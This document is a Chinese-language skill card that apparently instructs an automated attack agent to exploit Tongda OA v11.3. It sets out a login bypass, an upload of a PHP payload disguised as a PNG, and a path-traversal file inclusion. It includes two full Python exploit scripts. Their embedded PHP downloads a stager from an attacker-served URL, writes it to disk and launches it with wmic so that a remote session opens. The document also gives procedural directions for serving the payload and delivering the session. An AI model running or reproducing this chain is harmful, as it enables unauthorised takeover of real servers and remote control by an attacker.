---
name: tongda-oa-include-rce
handover: runtime
description: 经固定上传与文件包含链取得本次命令回显，并在需要时把同一次执行交付成一条主机会话引用。适用：绑定图给定的方法与目标；执行位置可作为多跳出口，位置记录必须随证据保存。
metadata:
  predicates:
  - command_interpreter
  - tongda_oa_v11_3
  - T1623
  platforms:
  - linux
  - windows
  keywords:
  - 通达OA任意文件包含
  - 通达OA文件包含
  - 通达文件包含命令回显
  - exploit.tongda_oa_include_rce
  - method
  - base
  - http
  - stage
  - code
  - cmd
  - command_interpreter
  - tongda_oa_v11_3
  - T1623
  - tongda
  - oa
  - include
  - rce
  resources: []
  categories:
  - action-method
  aliases:
  - 通达OA
  - 文件包含
  - RCE
  - tongda
  parameters:
  - host
  - url
  when:
    service: tongda_oa_v11_3
  requires: []
  excludes: []
  carriers:
  - kali
  - shell
serves:
- tongda_oa_v11_3
- commandInterpreterExploit
---

## 适用场景

通过固定上传与文件包含链取得本次命令回显；需要时把同一次执行交付成一条主机会话引用。目标须允许无需登录的附件上传与文件包含，且允许载荷使用的命令执行函数；入口被移除或相应问题已修复时不适用。

- 执行点需 POSIX shell、`base64`、`mkdir`、`printf` 与 `python3`；请求从绑定执行点发出，不要求 curl。
- 客户端仅实现 HTTP；目标侧命令按 cmd 包裹，启用复原还需要 PowerShell——不能据此宣称支持其他平台或 HTTPS。
- `target_url` **不是入口硬给的**：先做一次只读 HTTP 观察确认服务存在，从这次观察的原生 scheme/host/port 得出可用的 `target_url`（含入口路径），再进入利用段；不要自己新造端点。`command` 可选，省略时用 `whoami & hostname` 取身份回显；`include_path` 可选，由现场给出并优先于推导结果（该覆盖**不证明**它属于本次上传）。
- 配置参数包括执行点的 `payload_dir`、目标部署的 `web_root` 与 `restore`；前两项省略时用既有入口默认值，跨环境须核实。执行点及所需上游会话未就绪时不得派发或回退到控制端。
- 执行位置可作为多跳出口：**位置记录必须随证据保存**，否则同一条回显会被算到错误的边上。
- 观察视角按图固定的 `task.source_position` 核验（控制端规范为 `base`）；观察声明不改变工具实际执行点。工具用法与坑点见 `skills/_tooling/http-client.md`。

## 参数

- 输入 `target_url`：来自本次只读观察（原生 scheme/host/port + 入口路径），不是硬给的常量
- 输入 `command`：来自 model（可选；省略时用 `whoami & hostname` 取身份回显）
- 公开运行值（来自运行层，**不得自己编**）：`delivery_payload`、`delivery_callback_host`、`delivery_callback_port`、`delivery_fetch_port`、`delivery_stager_path`、`delivery_artifact_url`、`delivery_remote_path`、`delivery_work_dir`
- 交付：evidence、session
- 执行位置：本步绑定给出的执行面（起取件台在控制端；登录/上传/包含在执行面上）
- 可用工具：`cmd`、`code`、`stage`、`msf`
- 图适用：case=command_interpreter；service=tongda_oa_v11_3；technique=T1623；本卡 `serves`：`tongda_oa_v11_3`

## 步骤

**一条一个动作块；有依赖的步骤绝不合并。** 目标主机不能直连控制端交付（这条链只有一台能到它），所以载荷由**目标自己来取**：控制端提供取件地址，落到目标上的一小段取件器负责"下载 → 写盘 → 启动"。

**按名字走，一个都不能少**：**起取件台 → 落取件器 → 执行取件器 → 收尾**；造子弹与起监听由运行层在本卡之前完成。
只读 HTTP 观察**不是其中任何一步**（它只为"落取件器"里的 `target_url` 服务），**不能顶替起取件台**；取件台没起来就会服务一个空目录（真机第 44/45 轮的回执就是 `AGV_L2:0` 或 `agv_stager.exe 不存在`）。顺序固定：

**控制端只剩一个动作**：`起取件台` = `{"tool":"serve_file","target":"kali",…}`（控制面）。**不要用 `cmd`/`tool` 去跑 `msfvenom`、`python3 -m http.server` 这类控制端命令**——那是目标面工具，`via` 会被冻结入口校验挡住而整步作废（真机第 49 轮就是这么废掉三步的）。

**监听与弹头由运行层预置（本卡不再造子弹、不再起监听）**：运行层已按目标平台选好`delivery_payload`、分配回调端口、武装 handler，并用同一 payload 和同一端口生成了弹头。本卡只使用 `delivery_stager_path`、`delivery_artifact_url`、`delivery_remote_path`、`delivery_callback_host`、`delivery_callback_port`。


**起取件台（`serve_file` 工具，在控制端，一发；进入条件：运行层已给出 `delivery_work_dir` 与 `delivery_fetch_port`）**：

   ```sh
   {"tool":"serve_file","target":"kali","arguments":{"directory":"<delivery_work_dir>","port":<delivery_fetch_port>}}
   ```

   回执含 `agv-http-started` 再往下。取件地址就是 `<delivery_artifact_url>`。

**落取件器（把脚本送到执行面）（`stage`，一发；进入条件：已读到 **起取件台** 回执里的 `agv-http-started`）**：本卡的固定脚本见"取件器脚本"，把里面的 `{fetch_url}` 换成 **起取件台** 给出的取件地址、`{remote_path}` 换成**本次 attempt 唯一的落点**（例如 `C:\Windows\Temp\agv_stager_<本次 run/attempt>.exe`）之后，整段文本用 `stage` 落到执行面：

   ```json
   {"tool":"stage_file","target":"session","arguments":{"path":"/tmp/agv_tongda.py","text":"<替换过占位符的取件器脚本全文>"}}
   ```

   回执给的是执行面上的路径与 sha256；后面两步都用这个路径，不要自己改文件名。

**执行取件器（`cmd`，在执行面，一发；进入条件：**落取件器** 回执给出的路径与摘要，且 **造子弹** 的产物就在被服务的目录里——不确定就先做一次只读核对 `ls -l <delivery_work_dir>`）**：

   ```sh
   python3 -u /tmp/agv_tongda.py
   ```

   对应请求形状：

   ```text
   {"tool":"run_command","target":"session","arguments":{"interpreter":"bash","command":"python3 -u /tmp/agv_tongda.py","timeout":120}}
   ```

   脚本自己完成"登录 → 上传取件器 → 包含执行 → 启动载荷"，并在 stdout 打印 `AGV_L1` / `AGV_L2:<bytes>` / `AGV_L3OK|AGV_L3FAIL` / `AGV_L4:<text>` 四个标记。**照抄回执原文**，不要把标记当成功依据之外的推断材料。

   **本步的完成依据（缺一不可）**：回执同时含 `AGV_L1`、`AGV_L2:<N>`、`AGV_L3OK`、`AGV_L4:`，且 **N 必须大于 0**（那是"目标真的下载到了多少字节"的直证）。**`AGV_L2:0` = 目标没取到件**（第 2 步的取件台没在听，或目标到控制端不通）——这种情况**不算完成**：先核对取件台（端口在听、目录里有 `agv_stager.exe`、目标能到该地址）再重发本步，不要把它当作已交付。**`AGV_L3FAIL` = 目标写不进 `{remote_path}`**：常见原因是固定文件被上一次 attempt 占用/锁定；换本次 attempt 的唯一落点重发，不要反复覆盖同一路径。

**收尾**：按 `citations` 引本次回执，然后 `finish`。**会话由运行层认领、登记并探活，本卡不自己登记会话**；只做到命令回显、没有会话就是**没完成**。

**执行面 ≠ 目标（本卡最容易写错的一处）**：本卡的动作在**源主机**上执行（多跳出口），而 `target_url` 指向的是**目标主机**：观察与利用都要打 `context.node.target_host` 对应的地址；把 `target_url` 写成执行面自己的地址，会在取件器里直接得到 `ConnectionRefusedError`（真机第 42 轮就是这么失败的）。

**不许"看着像做过"就往下走**：每一步开始前必须能指出**上一步回执里的哪一行**是你现在要用的东西（`起取件台` 要运行层公开的目录与端口；`落取件器` 要 `起取件台` 的 `agv-http-started`；`执行取件器` 要 `落取件器` 的路径与摘要，**并且运行层生成的弹头必须已经在被服务的目录里**——不确定就先只读核对 `ls -l <delivery_work_dir>`）。指不出来 = 退回补那一步，再继续。

### 参数来源表（集中定义一次；关键步骤照此核对）

| 字段 | 唯一来源 | 用途 | 缺失时 |
|---|---|---|---|
| `target_url` | **本次只读观察**得到的原生 scheme/host/port | 取件器里的 `BASE`（指向**目标主机**） | **停止**：不得用执行面自己的地址或任何配置默认值补齐 |
| `delivery_callback_host` / `delivery_callback_port` | 运行层公开值 | 只用于核对本次回调方向；运行时已武装 handler | 停止并如实报缺 |
| `delivery_fetch_port` / `delivery_work_dir` | 运行层公开值 | 起取件台与取件地址 | 停止并如实报缺 |
| 执行面（`via`） | 本步绑定的执行入口 | 决定命令在哪台机器上跑（**源主机**） | 停止；不得改成别的主机 |

**两个角色分别确认**：执行面是源主机、`target_url` 是目标主机；**即使两者恰好相同也要分别确认来源**。

### 每一步的进入条件 / 完成证据 / 停止条件

| 步 | 进入条件（没有它就不得开始） | 完成证据 | 停止条件 |
|---|---|---|---|
| 0 运行时预置 | 运行层公开值齐备 | 弹头路径存在、handler 已武装 | 无公开值 → 停 |
| 1 起取件台 | 目录与端口已给出 | 回执含 `agv-http-started` | 没有 → 停，不要起第二个 |
| 2 落取件器 | 第 1 步取件地址已确定 | 回执给出执行面路径 + `sha256` | 未给路径 → 停 |
| 3 执行取件器 | 第 2 步的路径与摘要**本次**刚拿到 | 回执含 `AGV_L1`、`AGV_L2:N`（**N>0**）、`AGV_L3OK`、`AGV_L4:` | 见下方判据 |
| 4 收尾 | 第 3 步完成证据齐全 | `finish` 引用本次回执 | — |

****执行取件器** 的判据（硬判据 + 不满足即阻断）**：`AGV_L2:0` 属于**可靠核对后确认应有产物却为空** → 判**失败**并阻断后续步骤（先核对 **起取件台**：端口在听、目录里有 `agv_stager.exe`、目标能到该地址）；产物暂时读不到、核对未完成、计数来源不可靠 → 判**未知**（保留证据、阻断依赖步骤，但**不得记成失败**）。

### 取件器脚本（固定文本，别改结构）

**已知限制（带范围与日期，别当成永久事实）**：在本部署当前版本上实测（2026-10-16）**参数传不进被触发的内容**，因此取件器必须**自包含**：无法传入的必要输入一律写在内容内部；这条限制**只针对无法传入的必要输入**，不表示禁止一切外部资源，也不得因此把凭据写进本卡。版本或部署变化后先核对本条再决定写法。

```python
import sys, urllib.parse, urllib.request
BASE = "{target_url}"
PHP = r"""<?php $u='{fetch_url}';$p='{remote_path}';echo 'AGV_L1';$d=@file_get_contents($u);echo 'AGV_L2:'.strlen((string)$d);$ok=@file_put_contents($p,$d);echo 'AGV_L3'.($ok===false?'FAIL':'OK');$h=popen('wmic process call create '.$p,'r');$r='';while(!feof($h)){$r.=fgets($h);}pclose($h);echo 'AGV_L4:'.substr($r,0,200);?>"""

def call(path, data, headers):
    req = urllib.request.Request(BASE + path, data=data, headers=headers)
    with urllib.request.urlopen(req, timeout=25) as res:
        return res.read().decode("utf-8", "replace"), res.headers.get("Set-Cookie", "")

login, cookie = call("/logincheck_code.php", b"UID=1", {"Content-Type": "application/x-www-form-urlencoded"})
print("AGV_LOGIN:" + login[:40])
token = (login + " " + cookie).split("PHPSESSID=")[-1].split(";")[0]
b = "----agv"
body = ('--' + b + '\r\nContent-Disposition: form-data; name="P"\r\n\r\n1\r\n'
        '--' + b + '\r\nContent-Disposition: form-data; name="DEST_UID"\r\n\r\n1\r\n'
        '--' + b + '\r\nContent-Disposition: form-data; name="UPLOAD_MODE"\r\n\r\n2\r\n'
        '--' + b + '\r\nContent-Disposition: form-data; name="ATTACHMENT"; filename="agv.png"\r\n'
        'Content-Type: application/octet-stream\r\n\r\n' + PHP + '\r\n--' + b + '--\r\n')
up, _ = call("/ispirit/im/upload.php", body.encode(),
             {"Content-Type": "multipart/form-data; boundary=" + b, "Cookie": "PHPSESSID=" + token})
print("AGV_UPLOAD:" + up[:60])
head = up.split("[vm]")[1].split("|")
folder, stamp = head[0].split("@")[1].split("_")
inc = "/general/../../attach/im/" + folder + "/" + stamp + "." + head[1]
query = "json=" + urllib.parse.quote('{"url":"' + inc + '"}')
out, _ = call("/ispirit/interface/gateway.php?" + query, b"", {"Cookie": "PHPSESSID=" + token})
print("AGV_GATEWAY:" + out[:400])
if "AGV_L4" not in out:
    sys.exit(1)
```

（`{target_url}` 是本次只读观察得到的入口；`{fetch_url}` / `{remote_path}` 按第 3 步替换。上传回包里 `@` 后面是 `<目录>_<时间戳>`，包含路径要去掉 `<目录>_` 前缀只留时间戳——带前缀的写法服务端照样 200、但什么都没执行。）

**本卡的完成依据是「交付段」最后一步的回执**（载荷被目标取到并启动 / 会话已交付）：命令回显、PoC 成功、文件读取、身份证据都只是**中间观察**，**不能**用来判 `action_complete=true`。拿到交付段最后一步的回执即判 `passed` 且 `action_complete=true`，**不要再追加任何「确认会话」的探测**（监听列表、连接数、端口都不是完成依据）；会话的认领、登记与探活由运行层负责，它认领不到会**如实记录未确认**，那不是让你在本卡里继续试的理由。


## 完成依据

**`finish.verdict` 判本卡要求的事实是否成立（本次是否拿到可引用的命令回显 / 会话），不是"请求是否 200"。**

三个阻断闸为 freshness、target、effect；`identity_rule=null`。

- **freshness**：核对执行状态、调用锚定，以及已携带 marker 在原始输出中的对应关系。
- **target**：核对证据里的 `target_url` 与节点目标上下文；缺节点目标时与绑定输入对照（`target_url` 来自输入，不是独立采集的主机身份）。
- **effect**：注册规则 `wrapped_output_present`——入口把 marker 区块去首尾空白后写入 `command_output`，判定器结合该字段与原始输出评估包裹回显。

证据字段：`call_id`、`target_url`、`command_output`、`vantage_record`，原始输出为 `http_response`；会话交付变体另有会话登记与观察记录。

- **pass**：三个阻断闸均通过（上传成功或 HTTP 完成**不能**单独使本卡通过）。
- **unsatisfied**：任一阻断闸返回 unsatisfied，按既有聚合规则判不满足（例如回执完整却明确没有命令输出）。
- **uncertain**：没有阻断闸返回 unsatisfied，但某闸缺证据或返回 uncertain；`command_output` 缺失或为空时按不确定处理，不猜填。

通过只支持命令回显成立，不证明任意命令的预期业务效果、交互会话、下游权限或复原完成；**需要会话时必须有实际登记与随后观察，只完成命令回显不能声称会话交付**。

## 失败条件

- **停止边界：本卡一次调用只走上面那条固定序列；走完即 `finish`，不由本卡重试、重传或换卡。** 超时、断连、上传后路径无法推导等中途失败要保留调用与部分输出，核对已发生的文件与命令效果，交编排按通用核对与停止契约处理。
- 副作用包括执行点的材料化文件、目标上传文件与 `command` 自身的状态变化。`restore` 默认 `false`（保留包含路径供下游复用，但路径登记**不证明通道仍可用**）；`restore=true` 只尝试删除包含路径映射到的上传文件，**不撤销命令的其他效果**，也不清理执行点材料化文件；入口按复原标记分别记录成功/失败/未知，选择复原时不登记可复用包含路径。复原不是保证执行的收尾：提前退出可能未进入删除步骤；主调用通过不能替代清理核对。删除路径由包含路径与部署根计算、未探测真实部署，启用前须核实映射与文件归属。
- 输入转义影响引号与反斜杠；既有复原命令用 UTF-16LE/base64 的 PowerShell 调用并保留必需的输入重定向，这不表示任意输入都会被自动修正。命令长度按包装后的总长度控制在平台上限以下（入口没有自动长度拦截）；空回显或退出码为零不等于命令目标实现。
- 固定某个执行函数是为适配其他函数受限的环境；**若它也受限，不改换载荷**。

### 执行纪律（全局统一，爷爷 2026-10-07）

- **引文只能抄本次回执的原文**：卡里的示例、形状、别的轮次留下的编号都不是证据；引文失败时引擎会把**可引回执的原文片段**回喂 —— 照着那段抄。
- **一个动作一发**：一次回答只发一个动作；发了先读这一发的回执，再决定下一步。**有依赖的步骤绝不合并**：下一步要用的值（会话、落地文件名、返回的 id/句柄）只能从上一步的回包里拿；自己编一个值 = 打在空气上。
- **动作内部**的必要衔接照旧（`net use … && type …`、`cd /tmp && ./x`）：那是这条命令自己的用法，交给位置自己的 shell；**不许做的是把多个动作拼成一条**（长行还会把回执尾巴弄丢）。
- **只写实测最小步**：每一步都要能说出"它的产出是下一步的什么必需输入"；探测（pre）类 = 一条命令 + 判据；利用类 = 2~5 步。
- **卡里声明了收尾要跑的那条命令，就照它跑**：不要自己另拼一套等价写法、不要换文件名、不要照抄载荷本体重造一遍；工具面统一为一种动作形态（脚本 / 工具 / 命令之一）。
- **本步的执行依据（与本节其他条款、以及本卡前面章节冲突时，以本节为准）**：以**当前卡**为依据，只用本卡声明的工具面与**本步已绑定**的资产；固定路线按卡执行，不得另造路线、不得用未声明的脚本工具替代；不得把其他节点的卡片或未绑定资产当成本步依据；收到拒绝后先核对工具面与既定路线再修正被拒字段，**内容未经修改的被拒请求不得重发**；调用结果未明确时遵守引擎停止要求；拒绝、重复拦截与"根本没执行"**都不是目标侧结果**，不得据此判"不满足"；结论必须依据本步有效执行证据，缺证据记未确认，**不得把未执行写成已验证**。

[共享执行规则](../../src/skills/templates/execution_rules.txt)

### 取件器脚本（固定，照抄；下载与启动都在 PHP 内完成）

把下面整段用 `stage` 落到执行面（替换 `{target_url}` / `{fetch_url}` / `{remote_path}`），
再 `python3 <落点>` 执行。**下载与启动都放在 PHP 里**：`file_get_contents` 不经过 cmd，
`wmic process call create` 创建进程后立即返回。实测（2026-10-18）：把 `certutil` / `start`
放进 gateway 的 `cmd` 参数会让 `popen` 一直等到载荷结束，请求挂住、整步超时；
PHP 原生下载 + `wmic` 创建进程能在几秒内返回。

```python
#!/usr/bin/env python3
import time
import urllib.parse, urllib.request

BASE = "{target_url}".rstrip("/")
FETCH = "{fetch_url}"
REMOTE = r"{remote_path}"

def call(path, body=b"", headers=None):
    req = urllib.request.Request(BASE + path, data=body or None, headers=headers or {})
    with urllib.request.urlopen(req, timeout=25) as res:
        return res.read().decode("utf-8", "replace"), res.headers.get("Set-Cookie", "")

# The service may still be starting right after a lab reset: retry only on failure.
login = cookie = ""
for _attempt in range(6):
    try:
        login, cookie = call("/logincheck_code.php", b"UID=1",
                             {"Content-Type": "application/x-www-form-urlencoded"})
        break
    except Exception:
        if _attempt == 5:
            raise
        time.sleep(5)
print("AGV_L1:" + login[:40])
token = (login + " " + cookie).split("PHPSESSID=")[-1].split(";")[0]

php = ("<?php $u='" + FETCH + "';$p='" + REMOTE + "';echo 'AGV_D1';"
       "$d=@file_get_contents($u);echo 'AGV_D2:'.strlen((string)$d);"
       "$ok=@file_put_contents($p,$d);echo 'AGV_D3'.($ok===false?'FAIL':'OK');"
       "$h=popen('wmic process call create '.$p,'r');$r='';"
       "while(!feof($h)){$r.=fgets($h);}pclose($h);echo 'AGV_D4:'.substr($r,0,200);?>")
b = "----agv"
body = ('--' + b + '\r\nContent-Disposition: form-data; name="P"\r\n\r\n1\r\n'
        '--' + b + '\r\nContent-Disposition: form-data; name="DEST_UID"\r\n\r\n1\r\n'
        '--' + b + '\r\nContent-Disposition: form-data; name="UPLOAD_MODE"\r\n\r\n2\r\n'
        '--' + b + '\r\nContent-Disposition: form-data; name="ATTACHMENT"; filename="agv.png"\r\n'
        'Content-Type: application/octet-stream\r\n\r\n' + php + '\r\n--' + b + '--\r\n')
up, _ = call("/ispirit/im/upload.php", body.encode(),
             {"Content-Type": "multipart/form-data; boundary=" + b,
              "Cookie": "PHPSESSID=" + token})
print("AGV_U:" + up[:50])
head = up.split("[vm]")[1].split("|")
folder, stamp = head[0].split("@")[1].split("_")
inc = "/general/../../attach/im/" + folder + "/" + stamp + "." + head[1]

query = "json=" + urllib.parse.quote('{"url":"' + inc + '"}')
out, _ = call("/ispirit/interface/gateway.php?" + query, b"",
              {"Cookie": "PHPSESSID=" + token})
print("AGV_G:" + str(len(out)))
print("AGV_D4OK" if "AGV_D4" in out else "AGV_D4FAIL")
print("AGV_OUT:" + out[:300])
```
